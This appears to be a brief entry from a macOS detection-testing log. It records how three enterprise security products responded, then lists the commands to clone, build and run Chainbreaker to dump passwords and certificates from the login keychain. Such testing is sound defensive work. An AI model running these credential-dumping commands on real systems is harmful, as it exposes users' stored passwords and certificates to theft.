**Detections**
* Enterprise EDR Solution 1: No
* Enterprise EDR Solution 2: Yes (Blocked)
* Enterprise YARA Solution: No

Cloned and ran [Chainbreaker](https://github.com/n0fate/chainbreaker), a tool to dump passwords and certs from the keychain. 

`git clone https://github.com/n0fate/chainbreaker`

`cd chainbreaker`

`pip install -r requirements.txt`

`python setup.py bdist_wheel -d dist`

`pip install -e .`

`python -m chainbreaker --dump-all ~/Library/Keychains/login.keychain-db --password-prompt`